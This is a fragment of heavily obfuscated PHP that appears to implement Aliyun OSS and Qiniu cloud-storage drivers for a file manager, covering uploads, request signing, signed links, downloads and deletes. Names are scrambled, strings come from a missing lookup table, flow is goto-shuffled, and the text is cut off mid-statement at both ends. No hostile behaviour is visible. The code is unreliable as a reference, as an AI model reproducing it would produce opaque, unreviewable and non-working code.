$dáÀƒ”±Åç = $this->trafficLimit($dàùÒÊÚˆ‡[1243], $dáÀƒ”±Åç); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($c…§äĞÊÏ), $aÎŠ†À´ÉÈ, $dáÀƒ”±Åç); } catch (OSS\Core\OssException $Fïñ©­ƒ¿Æ) { return !1; } return $this->getPathOuter($D·“š¿‡’); } public function getHost() { $d “ÔìíÎ´ =& $_SERVER[úÎü]; $EªÜº“¥’ = explode($d “ÔìíÎ´[175], parent::getHost()); return $EªÜº“¥’[0] . $d “ÔìíÎ´[175] . $this->bucket . $d “ÔìíÎ´[91] . $EªÜº“¥’[1]; } public function uploadFormData($A‡Í¶†Á‚½, $D—§áñôÀ† = 3600) { goto CÄˆ­‹ÊØ’; C¨÷´ˆùÉ‡: $d«å‰ğ„Ÿğ = base64_encode(hash_hmac($eîµ•ØòÏ†[226], $Fª’ò½‡Å, $this->secret, !0)); $eÈõ¿‰ÚÖ = array($eîµ•ØòÏ†[1157] => $Fª’ò½‡Å, $eîµ•ØòÏ†[1249] => $this->accessKey, $eîµ•ØòÏ†[1153] => $eîµ•ØòÏ†[1145], $eîµ•ØòÏ†[1250] => $d«å‰ğ„Ÿğ, $eîµ•ØòÏ†[173] => $Bä˜Ñˆç); $eÈõ¿‰ÚÖ = $this->trafficLimit($eîµ•ØòÏ†[1243], $eÈõ¿‰ÚÖ); goto e…æÊ†«—; e…æÊ†«—: return $eÈõ¿‰ÚÖ; goto cÜ„ğŠ²ù; cÚ±´Æ®«À: $BÓ¦šãÍ‹ = date($eîµ•ØòÏ†[1246], time() + $c‹Ò—Ü©æ”); $EºÔ´ÍÓ“§ = new DateTime($BÓ¦šãÍ‹); $d…†›•§ƒœ = $EºÔ´ÍÓ“§->format(DateTime::ISO8601); goto CÖ•ØˆÅ£¢; CÄˆ­‹ÊØ’: $eîµ•ØòÏ† =& $_SERVER[úÎü]; if (!($Bä˜Ñˆç = $this->getHost())) { return !1; } $c‹Ò—Ü©æ” = $D—§áñôÀ†; goto cÚ±´Æ®«À; E™âÌŞæ˜¦: $eµ‚¥™Òˆ‘ = $this->pathFather($A‡Í¶†Á‚½); $cìÎ¹Ùã¨í = array($eîµ•ØòÏ†[1147] => $d…†›•§ƒœ, $eîµ•ØòÏ†[1148] => array(array($eîµ•ØòÏ†[1248], 0, $B¥öÚÚ’˜), array($eîµ•ØòÏ†[1151], $eîµ•ØòÏ†[1152], $eµ‚¥™Òˆ‘))); $Fª’ò½‡Å = base64_encode(json_encode($cìÎ¹Ùã¨í)); goto C¨÷´ˆùÉ‡; CÖ•ØˆÅ£¢: $e†Ò‘Üõà = strpos($d…†›•§ƒœ, $eîµ•ØòÏ†[290]); $d…†›•§ƒœ = substr($d…†›•§ƒœ, 0, $e†Ò‘Üõà) . $eîµ•ØòÏ†[1247]; $B¥öÚÚ’˜ = 1048576000 * 5; goto E™âÌŞæ˜¦; cÜ„ğŠ²ù: } public function multiUploadFormData($d…¢…àÏ×¸, $CÑÍê¯‘² = 3600) { $cÀ‚¦êŒƒç =& $_SERVER[úÎü]; if (!($fÛ‹¦òÖºÓ = $this->getHost())) { return !1; } $AÅ–“¨Œ’ó = $this->trafficLimit($cÀ‚¦êŒƒç[1243]); $BÇª¶¤£¯ù = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($d…¢…àÏ×¸), $AÅ–“¨Œ’ó); return array($cÀ‚¦êŒƒç[217] => $BÇª¶¤£¯ù, $cÀ‚¦êŒƒç[173] => $fÛ‹¦òÖºÓ . $cÀ‚¦êŒƒç[8] . $this->pathEncode($d…¢…àÏ×¸), $cÀ‚¦êŒƒç[218] => gmdate($cÀ‚¦êŒƒç[1251]), $cÀ‚¦êŒƒç[89] => $d…¢…àÏ×¸); } public function multiUploadAuthData($EƒãÍ¤ÚùÛ, $Fº•¿Ø™Ğ = array()) { goto ağôé’; ağôé’: $AŠîŠõ³¿ =& $_SERVER[úÎü]; $cÆÈÎ°·˜İ = isset($Fº•¿Ø™Ğ[$AŠîŠõ³¿[218]]) ? $Fº•¿Ø™Ğ[$AŠîŠõ³¿[218]] : gmdate($AŠîŠõ³¿[1251]); $C œ®³Š‚ = isset($Fº•¿Ø™Ğ[$AŠîŠõ³¿[165]]) ? $Fº•¿Ø™Ğ[$AŠîŠõ³¿[165]] : $AŠîŠõ³¿[33]; goto b–ø‚˜Ë³÷; b–ø‚˜Ë³÷: $BÜïÌ’©… = $EƒãÍ¤ÚùÛ; if (isset($Fº•¿Ø™Ğ[$AŠîŠõ³¿[89]])) { $BÜïÌ’©… = $Fº•¿Ø™Ğ[$AŠîŠõ³¿[89]]; unset($Fº•¿Ø™Ğ[$AŠîŠõ³¿[89]]); } if (isset($Fº•¿Ø™Ğ[$AŠîŠõ³¿[219]])) { $Fº•¿Ø™Ğ[$AŠîŠõ³¿[218]] = $cÆÈÎ°·˜İ; return $this->listUploadParts($BÜïÌ’©…, $Fº•¿Ø™Ğ); } goto B×²ÁÅ‚ÄÌ; B×²ÁÅ‚ÄÌ: $B‡ÖÃ¾‹ªˆ = array($AŠîŠõ³¿[220], $AŠîŠõ³¿[33], $AŠîŠõ³¿[116], $cÆÈÎ°·˜İ, "\x78\x2d\157\163\163\x2d\144\141\164\x65\x3a{$cÆÈÎ°·˜İ}", $AŠîŠõ³¿[8] . $this->bucket . $AŠîŠõ³¿[8] . $BÜïÌ’©… . $C œ®³Š‚); if (strpos($C œ®³Š‚, $AŠîŠõ³¿[221]) === 0) { $B‡ÖÃ¾‹ªˆ[0] = $AŠîŠõ³¿[222]; if ($b¯Æç±¡£á = $this->trafficLimit($AŠîŠõ³¿[1243])) { $BÜïÌ’©… = $AŠîŠõ³¿[1252]; array_splice($B‡ÖÃ¾‹ªˆ, 5, 0, $BÜïÌ’©… . $AŠîŠõ³¿[4] . $b¯Æç±¡£á[$BÜïÌ’©…]); } } if (isset($Fº•¿Ø™Ğ[$AŠîŠõ³¿[223]]) && $Fº•¿Ø™Ğ[$AŠîŠõ³¿[223]] == $AŠîŠõ³¿[224]) { $B‡ÖÃ¾‹ªˆ[0] = $AŠîŠõ³¿[224]; } goto F×²ÅŠÙ ¤; fÄå“©Ö·¬: $d¸¯˜ê¬í = $AŠîŠõ³¿[1216] . $this->accessKey . $AŠîŠõ³¿[4] . $a´ëò‘„š¾; if (strpos($C œ®³Š‚, $AŠîŠõ³¿[221]) === 0) { $d¸¯˜ê¬í = array($AŠîŠõ³¿[228] => $d¸¯˜ê¬í, $AŠîŠõ³¿[218] => $cÆÈÎ°·˜İ); if ($b¯Æç±¡£á) { $d¸¯˜ê¬í = array_merge($d¸¯˜ê¬í, $b¯Æç±¡£á); } } return $d¸¯˜ê¬í; goto Bï†öêßŞ†; F×²ÅŠÙ ¤: if (!empty($Fº•¿Ø™Ğ[$AŠîŠõ³¿[1253]])) { $BÛ÷—‘ä = array_merge(array($B‡ÖÃ¾‹ªˆ[4]), $Fº•¿Ø™Ğ[$AŠîŠõ³¿[1253]]); sort($BÛ÷—‘ä); $B‡ÖÃ¾‹ªˆ[4] = implode($AŠîŠõ³¿[225], $BÛ÷—‘ä); } $CØŸÖ˜–ƒ = implode($AŠîŠõ³¿[225], $B‡ÖÃ¾‹ªˆ); $a´ëò‘„š¾ = base64_encode(hash_hmac($AŠîŠõ³¿[226], $CØŸÖ˜–ƒ, $this->secret, !0)); goto fÄå“©Ö·¬; Bï†öêßŞ†: } public function listUploadParts($a…ŒÃ‡Ã„ç, $c“‹“¡†©¢) { goto E’ÚàØœ¨; E’ÚàØœ¨: $a¦¡–â¡Ş =& $_SERVER[úÎü]; $eê¦Ô©åÒ‹ = parse_url_query($c“‹“¡†©¢[$a¦¡–â¡Ş[165]]); $AëØÒÂ† = $this->client->listParts($this->bucket, $this->pathEncode($a…ŒÃ‡Ã„ç), $eê¦Ô©åÒ‹[$a¦¡–â¡Ş[217]]); goto bìÄ”™Ê°º; bìÄ”™Ê°º: $C×ÃÓ«ç‘ = $AëØÒÂ†->getListPart(); $eâˆ‘•ÒµÚ = array(); foreach ($C×ÃÓ«ç‘ as $dİÇñùÆÊ) { $eâˆ‘•ÒµÚ[] = array($a¦¡–â¡Ş[1236] => $dİÇñùÆÊ->getPartNumber(), $a¦¡–â¡Ş[1237] => trim($dİÇñùÆÊ->getETag(), $a¦¡–â¡Ş[113])); } goto Ağ—ŠÈ«å; Ağ—ŠÈ«å: unset($c“‹“¡†©¢[$a¦¡–â¡Ş[219]], $c“‹“¡†©¢[$a¦¡–â¡Ş[223]]); $a¼Ãë¸“Å¯ = $this->multiUploadAuthData($a…ŒÃ‡Ã„ç, $c“‹“¡†©¢); if (empty($a¼Ãë¸“Å¯)) { return !1; } goto d²íô¿­½; d²íô¿­½: return array($a¦¡–â¡Ş[228] => $a¼Ãë¸“Å¯, $a¦¡–â¡Ş[218] => $c“‹“¡†©¢[$a¦¡–â¡Ş[218]], $a¦¡–â¡Ş[230] => $eâˆ‘•ÒµÚ); goto eõğŠƒ§’…; eõğŠƒ§’…: } public function download($dÁÄ´ã§ , $bİ”íö‹Ğá) { if ($this->isFolder($dÁÄ´ã§ )) { return !1; } try { $F‚¸£¿åÎÅ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $bİ”íö‹Ğá); $F‚¸£¿åÎÅ = $this->trafficLimit($_SERVER[úÎü][105], $F‚¸£¿åÎÅ); $this->client->getObject($this->bucket, $this->pathEncode($dÁÄ´ã§ ), $F‚¸£¿åÎÅ); } catch (OSS\Core\OssException $cÂ¶ºÂä‘–) { return !1; } return $bİ”íö‹Ğá; } public function fileSubstr($cšÀ¤ŠÒœò, $E¼êæôÖ³ = 0, $b×‰¸™Ò = false) { if ($E¼êæôÖ³ === -1) { $d¼¾Ñœ = array(); } else { if ($b×‰¸™Ò === !1) { $fò¡ÖÓôë˜ = $this->size($cšÀ¤ŠÒœò); } else { $fò¡ÖÓôë˜ = $E¼êæôÖ³ + $b×‰¸™Ò - 1; } $d¼¾Ñœ = array(OSS\OssClient::OSS_RANGE => "{$E¼êæôÖ³}\x2d{$fò¡ÖÓôë˜}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($cšÀ¤ŠÒœò), $d¼¾Ñœ); } catch (OSS\Core\OssException $cùÏ‹Ó‘ØÀ) { think_exception($cùÏ‹Ó‘ØÀ->getMessage()); return !1; } } private function trafficLimit($dªšÁ¤¡ñ¹, $C¢·Êˆ¿¡é = array()) { goto eÌÔ¯ã¼; eÌÔ¯ã¼: $Bë«â®•©Ä =& $_SERVER[úÎü]; if ($dªšÁ¤¡ñ¹ == $Bë«â®•©Ä[1243] && $this->isUploadServer() || $dªšÁ¤¡ñ¹ == $Bë«â®•©Ä[105] && $this->isFileOutServer()) { return $C¢·Êˆ¿¡é; } $aÓ˜Ëæä™¯ = floatval($GLOBALS[$Bë«â®•©Ä[6]][$Bë«â®•©Ä[84]][$Bë«â®•©Ä[103]][$dªšÁ¤¡ñ¹]) * 1024 * 1024 * 8; goto Fë•¢ÇÇ; b²À‡ƒöœ: return $C¢·Êˆ¿¡é; goto DÆßÄ¡Ğ•ß; Fë•¢ÇÇ: if (!$aÓ˜Ëæä™¯) { return $C¢·Êˆ¿¡é; } $aÓ˜Ëæä™¯ = $aÓ˜Ëæä™¯ < 819200 ? 819200 : ($aÓ˜Ëæä™¯ > 838860800 ? 838860800 : $aÓ˜Ëæä™¯); $C¢·Êˆ¿¡é[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($aÓ˜Ëæä™¯); goto b²À‡ƒöœ; DÆßÄ¡Ğ•ß: } public function link($B©¾›æŒùÂ, $f•Ï•²Šè® = array()) { $eÏ‹±ÚÂª =& $_SERVER[úÎü]; if (!$this->exist($B©¾›æŒùÂ) || $this->isFolder($B©¾›æŒùÂ)) { return !1; } try { $f•Ï•²Šè® = $this->trafficLimit($eÏ‹±ÚÂª[105], $f•Ï•²Šè®); $c©è±ÜÄš = $this->client->signUrl($this->bucket, $this->pathEncode($B©¾›æŒùÂ), 3600 * 12, $eÏ‹±ÚÂª[224], $f•Ï•²Šè®); return $this->getCdnLink($c©è±ÜÄš); } catch (OSS\Core\OssException $dÆóˆ¢Šã‘) { return !1; } } public function fileOut($F‡ëÆ˜Ä©ğ, $Fè•†Œ´æÃ = false, $F™´­¶»»ß = false, $Fç¶”ÑÑ× = '') { goto C¾àëÂœ; a¶²Áİ×†Ô: $eÊÖ„®´Ï“ = $this->link($F‡ëÆ˜Ä©ğ, $F¢ò’äù•); $this->fileOutLink($eÊÖ„®´Ï“); goto cµ„ò‰Ôëó; C¾àëÂœ: $E›Œ‹´à„° =& $_SERVER[úÎü]; if ($this->isFileOutServer()) { return $this->fileOutServer($F‡ëÆ˜Ä©ğ, $Fè•†Œ´æÃ, $F™´­¶»»ß, $Fç¶”ÑÑ×); } if (!$F™´­¶»»ß) { $F™´­¶»»ß = $this->pathThis($F‡ëÆ˜Ä©ğ); } goto F…¹ÃÊÄ·; bÕ¦²é½…–: $Fè•†Œ´æÃ = $Fè•†Œ´æÃ ? $E›Œ‹´à„°[210] : $E›Œ‹´à„°[211]; $F¢ò’äù• = array(OSS\OssClient::OSS_SUB_RESOURCE => $E›Œ‹´à„°[1254] . rawurlencode("{$Fè•†Œ´æÃ}\x3b\146\151\x6c\x65\156\141\155\145\75{$F™´­¶»»ß}")); $F¢ò’äù•[OSS\OssClient::OSS_SUB_RESOURCE] .= $E›Œ‹´à„°[1255] . rawurlencode($AÕÑßõ¶Ú‘); goto a¶²Áİ×†Ô; F…¹ÃÊÄ·: $F™´­¶»»ß = rawurlencode($F™´­¶»»ß); $AÕÑßõ¶Ú‘ = get_file_mime(get_path_ext($F™´­¶»»ß)); if ($AÕÑßõ¶Ú‘ == $E›Œ‹´à„°[209]) { return parent::fileOut($F‡ëÆ˜Ä©ğ, $Fè•†Œ´æÃ, $F™´­¶»»ß, $Fç¶”ÑÑ×); } goto bÕ¦²é½…–; cµ„ò‰Ôëó: } public function fileOutServer($DİÎÕÃ¾÷Ú, $cÊ‡äÓ»§¡ = false, $A§­Õ¨àŞ = false, $EÄ‡·Åò„Ñ = '') { parent::fileOut($DİÎÕÃ¾÷Ú, $cÊ‡äÓ»§¡, $A§­Õ¨àŞ, $EÄ‡·Åò„Ñ); } public function fileOutImage($Díë‚Ÿà×, $b Ä‹í…²ç = 250) { $FçğæÎˆ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[úÎü][1256] . $b Ä‹í…²ç); $c‰ˆÀà“Ø• = $this->link($Díë‚Ÿà×, $FçğæÎˆ); $this->fileOutLink($c‰ˆÀà“Ø•); } public function fileOutImageServer($Bº•…ªØ­, $F¬¯øÁé•° = 250) { parent::fileOutImage($Bº•…ªØ­, $F¬¯øÁé•°); } public function fileOutLink($f³íôŒùÕ) { $AŞ¾±Ÿ·ôì =& $_SERVER[úÎü]; if (!$this->isCdnHost() && substr($f³íôŒùÕ, 0, 7) == $AŞ¾±Ÿ·ôì[1160]) { $f³íôŒùÕ = $AŞ¾±Ÿ·ôì[1161] . substr($f³íôŒùÕ, 7); } header($AŞ¾±Ÿ·ôì[156] . $f³íôŒùÕ); die; } public function hashMd5($C‹àãáäÃ, $A¦­ñ­¥¼÷ = '') { $bÉ²Ù›ƒÓ÷ =& $_SERVER[úÎü]; $E‡ê¶ŒÖ¬¨ = $this->_objectMeta($C‹àãáäÃ); if (!$E‡ê¶ŒÖ¬¨) { return $bÉ²Ù›ƒÓ÷[33]; } if (!isset($E‡ê¶ŒÖ¬¨[$bÉ²Ù›ƒÓ÷[1232]]) && !empty($A¦­ñ­¥¼÷)) { $d×•ÒÇëÓÄ = $this->updateObjMeta($C‹àãáäÃ, array($bÉ²Ù›ƒÓ÷[1232] => $A¦­ñ­¥¼÷)); $E‡ê¶ŒÖ¬¨[$bÉ²Ù›ƒÓ÷[1232]] = $d×•ÒÇëÓÄ ? $A¦­ñ­¥¼÷ : $bÉ²Ù›ƒÓ÷[33]; } return isset($E‡ê¶ŒÖ¬¨[$bÉ²Ù›ƒÓ÷[1232]]) ? strtolower($E‡ê¶ŒÖ¬¨[$bÉ²Ù›ƒÓ÷[1232]]) : $bÉ²Ù›ƒÓ÷[33]; } public function size($CºæŒ) { $Eø¶‹ÈğÇö = $this->objectMeta($CºæŒ); return $Eø¶‹ÈğÇö ? $Eø¶‹ÈğÇö[$_SERVER[úÎü][77]] : 0; } public function info($dÚÃ”Áí»¿) { if ($this->isFolder($dÚÃ”Áí»¿)) { return $this->folderInfo($dÚÃ”Áí»¿); } else { if ($this->isFile($dÚÃ”Áí»¿)) { return $this->fileInfo($dÚÃ”Áí»¿); } } return !1; } public function exist($A™ŠòÄ™»â) { return $this->isFile($A™ŠòÄ™»â) || $this->isFolder($A™ŠòÄ™»â); } public function isFile($D“Ÿñ½„ŒÎ) { return !$this->isFolder($D“Ÿñ½„ŒÎ) && $this->objectMeta($D“Ÿñ½„ŒÎ); } public function isFolder($DÅ¼‰Àö‡) { return $this->cacheMethod($_SERVER[úÎü][195], $DÅ¼‰Àö‡); } protected function objectMeta($d©‘²¥¡¶) { return $this->cacheMethod($_SERVER[úÎü][196], $d©‘²¥¡¶); } protected function _objectMeta($a·ë××³Œ) { $fÁÕ‡¹•Ö =& $_SERVER[úÎü]; try { $A×³éÖ‚á = $this->client->getObjectMeta($this->bucket, $this->pathEncode($a·ë××³Œ)); } catch (OSS\Core\OssException $f”Ë¼³ª³İ) { $A×³éÖ‚á = !1; } if ($A×³éÖ‚á) { $A×³éÖ‚á[$fÁÕ‡¹•Ö[77]] = intval($A×³éÖ‚á[$fÁÕ‡¹•Ö[1230]]); } return $A×³éÖ‚á; } protected function _isFolder($f´öÚµ§àã) { $B…ğ¤Ç¿§Î =& $_SERVER[úÎü]; if ($f´öÚµ§àã == $B…ğ¤Ç¿§Î[33] || $f´öÚµ§àã == $B…ğ¤Ç¿§Î[8]) { return !0; } $Dò¼´Ó†’ğ = array($B…ğ¤Ç¿§Î[1226] => $B…ğ¤Ç¿§Î[8], $B…ğ¤Ç¿§Î[1227] => rtrim($f´öÚµ§àã, $B…ğ¤Ç¿§Î[8]) . $B…ğ¤Ç¿§Î[8], $B…ğ¤Ç¿§Î[1228] => 1, $B…ğ¤Ç¿§Î[1229] => $B…ğ¤Ç¿§Î[33]); $bŞ‡Æ¬´³¦ = $this->client->listObjects($this->bucket, $Dò¼´Ó†’ğ); if ($bŞ‡Æ¬´³¦->getObjectList() || $bŞ‡Æ¬´³¦->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($bæ‡‚Æ‚‚´) { parent::__construct(); require_once SDK_DIR . $_SERVER[úÎü][1257]; $this->_init($bæ‡‚Æ‚‚´); } public function _init($c©´Ï¨°›¦) { goto B¾«¢®†Ôº; a®Ñó¯Ş¥Ê: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto eƒ–×‰œ±ä; B¾«¢®†Ôº: $CÎ¬ƒç´–„ =& $_SERVER[úÎü]; foreach ($c©´Ï¨°›¦ as $A…•…ï°’¦ => $Dğƒ¼éÇğ) { if (isset($this->{$A…•…ï°’¦})) { $this->{$A…•…ï°’¦} = $Dğƒ¼éÇğ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($CÎ¬ƒç´–„[1258] . LNG($CÎ¬ƒç´–„[1217])); } goto a®Ñó¯Ş¥Ê; eƒ–×‰œ±ä: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto d¡…ÔŞĞ; d¡…ÔŞĞ: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($eæ…ã¿Î, $Eµ×¨æ‰ÑÔ = '', $F¾êëƒçÊ = REPEAT_RENAME) { if ($this->setContent($eæ…ã¿Î, $Eµ×¨æ‰ÑÔ)) { return $this->getPathOuter($eæ…ã¿Î); } return !1; } public function mkdir($EçõçŒÅ†¶, $a¶»ÌˆµÄ² = REPEAT_SKIP) { goto aÕ£ï¯Ë“ò; CÚ’®øøŸ¤: if (!$this->mkfile($FÉëà‘£)) { return !1; } if (!$this->moveFile($FÉëà‘£, $EçõçŒÅ†¶)) { $this->delFile($FÉëà‘£); return !1; } return $this->getPathOuter($dÑáø©ÄÓ); goto fÑ‘ñË‹¬ã; eÕ÷ç„ó×÷: $EçõçŒÅ†¶ = $dÑáø©ÄÓ . $aíÂµâàèŞ[8]; $CÌ‚†Ÿá¸ = get_path_this($dÑáø©ÄÓ); $FÉëà‘£ = $EçõçŒÅ†¶ . $CÌ‚†Ÿá¸; goto CÚ’®øøŸ¤; aÕ£ï¯Ë“ò: $aíÂµâàèŞ =& $_SERVER[úÎü]; $dÑáø©ÄÓ = trim($EçõçŒÅ†¶, $aíÂµâàèŞ[8]); if ($this->_isFolder($dÑáø©ÄÓ)) { return $this->getPathOuter($dÑáø©ÄÓ); } goto eÕ÷ç„ó×÷; fÑ‘ñË‹¬ã: } public function copyFile($fîã‘£ˆõÕ, $EÁµÔ÷á†Ö) { $d¤ŸóÏ†É = $this->bucketManager->copy($this->bucket, $fîã‘£ˆõÕ, $this->bucket, $EÁµÔ÷á†Ö, !0); return $d¤ŸóÏ†É ? !1 : $this->getPathOuter($EÁµÔ÷á†Ö); } public function moveFile($d…½¡Ê²«, $Aé§İùùàŒ) { $f•ÂñƒÑ‡² = $this->bucketManager->move($this->bucket, $d…½¡Ê²«, $this->bucket, $Aé§İùùàŒ, !0); return $f•ÂñƒÑ‡² ? !1 : $this->getPathOuter($Aé§İùùàŒ); } public function delFile($E¢Ö®Üõì‚) { if (!$this->exist($E¢Ö®Üõì‚)) { return !0; } $B†Ü»÷ğ‹Ô = $this->bucketManager->delete($this->bucket, $E¢Ö®Üõì‚); return $B†Ü»÷ğ‹Ô ? !1 : !0; } public function delFolder($fÄªÉœĞ) { goto d÷²öÑšò; A‘§ïÀÕŞµ: $dŞø«Ğğ± = $this->fileList($fÄªÉœĞ); $this->listItemCache = !0; $Eœïô£¬¼ = trim($fÄªÉœĞ, $B…îºšëÑÕ[8]) . $B…îºšëÑÕ[8]; goto Dœ‡ÃŞ³Î¨; f™”ë´õ×: return $this->delByBatch($dŞø«Ğğ±[$B…îºšëÑÕ[74]]); goto BàƒíË¼; Dœ‡ÃŞ³Î¨: if (!empty($fÄªÉœĞ) && !in_array($Eœïô£¬¼, $dŞø«Ğğ±[$B…îºšëÑÕ[74]])) { $dŞø«Ğğ±[$B…îºšëÑÕ[74]][] = $Eœïô£¬¼; } $b†ÊİšÒ•œ = $this->delByBatch($dŞø«Ğğ±[$B…îºšëÑÕ[73]]); if (!$b†ÊİšÒ•œ) { return !1; } goto f™”ë´õ×; d÷²öÑšò: $B…îºšëÑÕ =& $_SERVER[úÎü]; if (!$this->exist($fÄªÉœĞ)) { return !0; } $this->listItemCache = !1; goto A‘§ïÀÕŞµ; BàƒíË¼: } private function delByBatch($fÍ²‡…‹Üø) { foreach (array_chunk($fÍ²‡…‹Üø, 1000) as $DñšÂŒ×çï) { $e£¥…±¾ğ = $this->bucketManager->buildBatchDelete($this->bucket, $DñšÂŒ×çï); list($dØ£¤Õùˆ, $F§‹Úˆ‘Ò) = $this->bucketManager->batch($e£¥…±¾ğ); if ($F§‹Úˆ‘Ò) { return !1; } } return !0; } public function rename($Fğñ‡š¼Ö, $fÁ°Ü¤‘¸Â) { return $this->renameObject($Fğñ‡š¼Ö, $fÁ°Ü¤‘¸Â); } public function fileInfo($B„¥æ•Àœ¼, $CÊ‡¨¹Å ³ = false, $A±Å÷õŒ¾ = array()) { goto c¥´á§¹—´; c¥´á§¹—´: $E‰¨İ»»¸ñ =& $_SERVER[úÎü]; $Cö˜ àò´ó = array($E‰¨İ»»¸ñ[28] => $this->pathThis($B„¥æ•Àœ¼), $E‰¨İ»»¸ñ[75] => $this->getPathOuter($E‰¨İ»»¸ñ[8] . $B„¥æ•Àœ¼), $E‰¨İ»»¸ñ[29] => $E‰¨İ»»¸ñ[171], $E‰¨İ»»¸ñ[77] => isset($A±Å÷õŒ¾[$E‰¨İ»»¸ñ[1259]]) ? $A±Å÷õŒ¾[$E‰¨İ»»¸ñ[1259]] : 0, $E‰¨İ»»¸ñ[165] => $this->ext($B„¥æ•Àœ¼)); if ($CÊ‡¨¹Å ³) { return $Cö˜ àò´ó; } goto Fœ™¶³–¤¥; Fœ™¶³–¤¥: $Cö˜ àò´ó[$E‰¨İ»»¸ñ[190]] = $Cö˜ àò´ó[$E‰¨İ»»¸ñ[107]] = 0; $Cö˜ àò´ó[$E‰¨İ»»¸ñ[191]] = $Cö˜ àò´ó[$E‰¨İ»»¸ñ[192]] = !0; if (empty($A±Å÷õŒ¾)) { $A±Å÷õŒ¾ = $this->objectMeta($B„¥æ•Àœ¼); if (!$A±Å÷õŒ¾) { return $Cö˜ àò´ó; } } goto Aƒ¥‚À‡‘“; Aƒ¥‚À‡‘“: if (isset($A±Å÷õŒ¾[$E‰¨İ»»¸ñ[1260]])) { $Cö˜ àò´ó[$E‰¨İ»»¸ñ[107]] = substr($A±Å÷õŒ¾[$E‰¨İ»»¸ñ[1260]] . $E‰¨İ»»¸ñ[33], 0, 10); } if (isset($A±Å÷õŒ¾[$E‰¨İ»»¸ñ[1259]])) { $Cö˜ àò´ó[$E‰¨İ»»¸ñ[77]] = $A±Å÷õŒ¾[$E‰¨İ»»¸ñ[1259]]; } return $Cö˜ àò´ó; goto eª”ÛÂ–ÃÀ; eª”ÛÂ–ÃÀ: } public function folderInfo($CÌËÏË¢ÒĞ, $C†Ö…‘À¢ = false) { goto DÄ²«ø´„; B´Ÿ¯ê£ : $D¬ÓÃÄíî[$D®›ŒìŠ’¸[190]] = $D¬ÓÃÄíî[$D®›ŒìŠ’¸[107]] = 0; $D¬ÓÃÄíî[$D®›ŒìŠ’¸[191]] = $D¬ÓÃÄíî[$D®›ŒìŠ’¸[192]] = !0; $CÌËÏË¢ÒĞ = rtrim($CÌËÏË¢ÒĞ, $D®›ŒìŠ’¸[8]) . $D®›ŒìŠ’¸[8]; goto A”¯ÒŒ™ÜŠ; A”¯ÒŒ™ÜŠ: $AÙË‘İ½Ø¡ = $this->objectMeta($CÌËÏË¢ÒĞ); if (isset($AÙË‘İ½Ø¡[$D®›ŒìŠ’¸[1260]])) { $D¬ÓÃÄíî[$D®›ŒìŠ’¸[107]] = substr($AÙË‘İ½Ø¡[$D®›ŒìŠ’¸[1260]] . $D®›ŒìŠ’¸[33], 0, 10); } return $D¬ÓÃÄíî; goto C«Å©äâ¿ğ; DÄ²«ø´„: $D®›ŒìŠ’¸ =& $_SERVER[úÎü]; $D¬ÓÃÄíî = array($D®›ŒìŠ’¸[28] => $this->pathThis($CÌËÏË¢ÒĞ), $D®›ŒìŠ’¸[75] => $this->getPathOuter($D®›ŒìŠ’¸[8] . $CÌËÏË¢ÒĞ), $D®›ŒìŠ’¸[29] => $D®›ŒìŠ’¸[76]); if ($C†Ö…‘À¢) { return $D¬ÓÃÄíî; } goto B´Ÿ¯ê£ ; C«Å©äâ¿ğ: } public function listPath($f…Ğ‚Äƒ·, $f³ªŸ‡à² = false) { $BÎÄ°æ—İÒ =& $_SERVER[úÎü]; $d ‹îÛÅÆå = $this->fileList($f…Ğ‚Äƒ·, $BÎÄ°æ—İÒ[8], !0); foreach ($d ‹îÛÅÆå[$BÎÄ°æ—İÒ[74]] as $a¯àÄÕãÜô => $A÷Ê¹‡ĞøØ) { $d ‹îÛÅÆå[$BÎÄ°æ—İÒ[74]][$a¯àÄÕãÜô] = $this->folderInfo($A÷Ê¹‡ĞøØ, $f³ªŸ‡à²); } foreach ($d ‹îÛÅÆå[$BÎÄ°æ—İÒ[73]] as $a¯àÄÕãÜô => $A÷Ê¹‡ĞøØ) { $d ‹îÛÅÆå[$BÎÄ°æ—İÒ[73]][$a¯àÄÕãÜô] = $this->fileInfo($A÷Ê¹‡ĞøØ[$BÎÄ°æ—İÒ[89]], $f³ªŸ‡à², $A÷Ê¹‡ĞøØ); } return $d ‹îÛÅÆå; } public function has($eå–Á¨…‘, $FÀö»°ªÅÍ = false, $bõĞÙ˜åÕ¡ = true) { goto b÷‚ßÉ¼‰; c¾º†ò®È¸: $A´™–ì„Ä… = $E¢¸ù¸â‡ª[33]; $F·‚‡ô¬ì´ = 500; $c½‡‰½‰î± = $E¢¸ù¸â‡ª[8]; goto ağ«ÙÎÁ˜È; eµ³ÄßÄ”Ë: return !1; goto AÍ«íìŒÒğ; ağ«ÙÎÁ˜È: $D„‡·«é¹ = $Dª„¶Òğì“ = 0; while (!0) { check_abort(); list($C«Ö÷‚Ìå¼, $cí†Ö¤‡›Û) = $this->bucketManager->listFiles($this->bucket, $b¢Ìœ£ªÉÏ, $A´™–ì„Ä…, $F·‚‡ô¬ì´, $c½‡‰½‰î±); if ($cí†Ö¤‡›Û) { break; } $A´™–ì„Ä… = array_key_exists($E¢¸ù¸â‡ª[1229], $C«Ö÷‚Ìå¼) ? $A´™–ì„Ä… = $C«Ö÷‚Ìå¼[$E¢¸ù¸â‡ª[1261]] : $E¢¸ù¸â‡ª[33]; if ($FÀö»°ªÅÍ) { if (!empty($C«Ö÷‚Ìå¼[$E¢¸ù¸â‡ª[1262]])) { $D„‡·«é¹ += count($C«Ö÷‚Ìå¼[$E¢¸ù¸â‡ª[1262]]); } if 